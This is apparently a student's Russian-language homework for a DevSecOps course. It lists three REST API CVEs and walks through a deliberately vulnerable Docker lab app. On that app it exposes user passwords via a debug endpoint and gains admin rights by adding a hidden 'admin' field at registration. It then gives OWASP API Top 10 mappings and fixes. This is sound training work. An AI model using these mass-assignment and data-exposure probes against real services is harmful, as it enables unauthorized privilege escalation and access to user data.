# Домашнее задание
Провести симуляцию атаки по одной из предложенных уязвимостей OWASP Top 10 - REST API

Цель:
1. найти CVE, относящиеся к недостаткам REST API.
2. на предоставленном стенде найти хотя бы один недостаток из top-10 rest api

## Описание/Пошаговая инструкция выполнения домашнего задания:
### Часть I.
Необходимо среди CVE за последний год найти 3 CVE, относящиеся к недостаткам REST API, входящим в owasp top-10 rest api. Пояснить, в чем заключается недостаток и какова его причина.
Ответ - текстовый файл с описанием.

### Часть II.

1. Скачать уязвимый образ с docker.hub, выполнив команду из консоли docker pull ket9/otus-devsecops-owasp-rest
2. Запустить образ docker run -d -p 8080:8080 ket9/otus-devsecops-owasp-rest:latest
3. Зайти на http://192.168.103.88:8080/, посмотреть, какой функционал доступен в приложении.
4. Наполнить базу данных, перейдя по ссылке http://192.168.103.88:8080/createdb <br/>
После этого вторую часть задания можно выполнить в двух вариациях: либо самостоятельно попробовать найти какой-то недостаток в приложении из owasp top-10 rest api, либо провести эмуляцию атаки (выполнить по шагам уже описанную уязвимость. Файл с описанием приложен к материалам лекции и называется homework-emu.txt) <br/>
Вне зависимости от того, какой вариант вы выбираете, ответом на дз будет текстовый файл, содержащий: 
5. ход ваших рассуждений, что пробовали делать, какой был ответ приложения, какие выводы вы из этого делали.
6. описание найденной уязвимости
7. к какому типу из 10 изученных относится недостаток
8. меры предотвращения

---
# Ответ

## Часть 1

### [OWASP API Security Top 10](https://www.wallarm.com/whats-wallarm-learning-center-api-security-owasp)

---

|#|Description|Code|
|-|-|-|
|1|Security advisory - ADSelfService Plus authentication bypass vulnerability|[CVE-2021-40539](https://www.manageengine.com/products/self-service-password/advisory/CVE-2021-40539.html)|
|2|Username enumeration on Jira Software Server 8.15|[CVE-2021-26081](https://jira.atlassian.com/browse/JRASERVER-72499)|
|3|Cisco Evolved Programmable Network Manager Sensitive Information Disclosure Vulnerability|[CVE-2021-34707](https://nvd.nist.gov/vuln/detail/CVE-2021-34707)|

---

1. CVE-2021-40539
<br/>Уязвимость позволяла обойти систему авторизации на сервере, выполнить произвольный код и таким образом получить доступ к локальной сети предприятия. Пострадали как минимум девять организаций в США

2. CVE-2021-26081
<br/>Уязвимость была найдена в Atlassian JIRA Server and Data Center до 8.5.13/8.13.5/8.16.0. Затронута неизвестная функция файла /rest/api/latest/user/avatar/temporary компонента REST API. Дата: 25.01.2021

3. CVE-2021-34707
<br/>Уязвимость найдена в Cisco Evolved Programmable Network Manager. Эксплуатация уязвимости может позволить нарушителю, действующему удаленно, получить несанкционированный доступ к защищаемой информации путем отправки специально созданного API -запроса. Дата: 15.06.2021

---

## Часть 2

### Запущу образ
docker run -d --name "otus_rest_1" -p 8080:8080 ket9/otus-devsecops-owasp-rest:latest

### Посмотрю функционал приложения
http://192.168.103.88:8080/

### Доступный функционал

```json
{
	"создать базу": "/createdb",
	"посмотреть информацию обо всех пользователях": "/users/v1",
	"посмотреть подробную информацию обо всех пользователях": "/users/v1/_debug",
	"регистрация нового пользователя": "/users/v1/register (HTTP POST)",
	"вход в приложение": "/users/v1/login (HTTP POST)",
	"просмотр пользователя по имени": "/users/v1/{username}",
	"удалить пользователя по имени (только для админов)": "/users/v1/{username} (HTTP DELETE)",
	"изменить email пользователя": "/users/v1/{username}/email (HTTP PUT)",
	"изменить пароль пользователя": "/users/v1/{username}/password (HTTP PUT)",
	"все книги": "/books/v1",
	"добавить книгу": "/books/v1 (HTTP POST)",
	"просмотр книги": "/books/v1/{book}"
}
```

### Выполню команду для создания БД
http://192.168.103.88:8080/createdb

Получен ответ от сервера
```json
{
	"message": "Database populated."
}
```

### Изучу остальные команды

По адресу http://192.168.103.88:8080/users/v1 получаю массив зарегистрированных пользователей:

```json
{
	"users":
	[
		{"email":"mail1@mail.com","username":"name1"},
		{"email":"mail2@mail.com","username":"name2"},
		{"email":"admin@mail.com","username":"admin"}
	]
}
```

Попробую зарегистрировать пользователя (воспользуюсь Insomnia):

Из предыдущего запроса известно, что у пользователя точно есть свойства:
<br/>email, username.

Попробую зарегистрировать пользователя (запросы POST)
<br/>http://192.168.103.88:8080/users/v1/register

Запрос 1. Заполню свойства 'username', 'email'
```json
{
	"username": "user100",
	"email": "email@email.email"
}
```

Ответ 1. Отсутствует обязательное свойство 'password'
```json
{
	"status": "fail",
	"message": "'password' is a required property"
}
```

Запрос 2. Заполню свойства 'username', 'password', 'email'
```json
{
	"username": "user100",
	"password": "password100",
	"email": "email@email.email"
	
}
```

Ответ 2. Все необходимые свойства заполнены. Пользователь создан
```json
{
	"message": "Successfully registered. Login to receive an auth token.",
	"status": "success"
}
```

Выполню запрос (GET), информацию "отладки":
<br/>- http://192.168.103.88:8080/users/v1/_debug

```json
{
	"users":
	[
		{"admin":false,"email":"mail1@mail.com","password":"pass1","username":"name1"},
		{"admin":false,"email":"mail2@mail.com","password":"pass2","username":"name2"},
		{"admin":true,"email":"admin@mail.com","password":"pass1","username":"admin"},
		{"admin":false,"email":"email@email.email","password":"password100","username":"user100"}
	]
}
```
<br/>У пользователя есть скрытое свойство 'admin'

Запрос 3. Создам новую учетную запись (запрос POST), добавив свойство 'admin' со значением 'True'
```json
{
	"username": "user101",
	"password": "password101",
	"email": "email1@email.email",
	"admin": "True"
}
```

Ответ 3. Пользователь создан
```json
{
	"message": "Successfully registered. Login to receive an auth token.",
	"status": "success"
}
```
Выполню запрос (GET), информацию "отладки" повторно:
<br/>- http://192.168.103.88:8080/users/v1/_debug

```json
{
	"users":
	[
		{"admin":false,"email":"mail1@mail.com","password":"pass1","username":"name1"},
		{"admin":false,"email":"mail2@mail.com","password":"pass2","username":"name2"},
		{"admin":true,"email":"admin@mail.com","password":"pass1","username":"admin"},
		{"admin":false,"email":"email@email.email","password":"password100","username":"user100"},
		{"admin":true,"email":"email1@email.email","password":"password101","username":"user101"}
	]
}
```

<br/>Учетная запись создана с правами администратора

### Найденные уязвимости

|#|Код|Описание|
|-|-|-|
|1|Раскрытие данных пользователей по адресу<br/>http://192.168.103.88:8080/users/v1/_debug|API3:2019 Excessive Data Exposure|
|2|Возможно создать администратора, заполнив скрытое свойство 'admin'<br/>http://192.168.103.88:8080/users/v1/register|API5:2019 Broken Function Level Authorization|
|3|Можно вносить изменения в свойства, к которым не предполагался доступ<br/>"admin":true|API6:2019 Mass Assignment|
|4|Использование протокола HTTP вместо безопасного HTTPS<br/>[http://192.168.103.88:8080](http://192.168.103.88:8080)|API7:2019 Security Misconfiguration|

---

### Предотвращение найденных уязвимостей

|#|Действия для устранения уязвимости|Код|
|-|-|-|
|1|- Backend-инженеры должны предоставлять в пользование только необходимые эндпоинты API<br/>- Необходимо изучить ответы от API, чтобы убедиться, что они содержат только безопасные данные<br/>- Необходимо реализовать механизм проверки ответов на REST-запросы на основе схемы в качестве доп. уровня безопасности.<br/>* по схеме определять данные возвращаемые всеми методами API, включая всевозможные ошибки|[API3:2019 Excessive Data Exposure](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa3-excessive-data-exposure.md)|
|2|- Убедиться что в системе административные функции выдаются согласно ролевой модели (например RBAC Roles)<br/>- Проверить наличие недостатков авторизации эндпоинтов API на функциональном уровне|[API5:2019 Broken Function Level Authorization](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa5-broken-function-level-authorization.md)|
|3|- Создать белый список свойств, которые может изменять пользователь. Вносить изменения только согласно этому списку<br/>- Использовать встроенные функции для внесения в черный список свойств, к которым пользователь не должен иметь доступ<br/>- Если возможно, явно определить и применять схемы проверки входных данных<br/>- По возможности избегать использования функций, которые автоматически связывают вводимые пользовательские данные с переменными кода или внутренними объектами|[API6:2019 Mass Assignment](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa6-mass-assignment.md)|
|4|- Убедиться, что доступ к API предоставлен только через необходмые REST-запросы. Ненужные REST-запросы должны быть отключены (например HEAD)<br/>- API к которым ожидается доступ из WEB-браузеров пользователей, должны реализовать надлежащую политику CORS<br/>- Исключить из сообщений возвращаемых сервером чувствительную информацию, например, трейсы стека<br/>- Выполнить тонкую настройку приложения, которые могут быть небезопасны с настройками по-умолчанию|[API7:2019 Security Misconfiguration](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa7-security-misconfiguration.md)|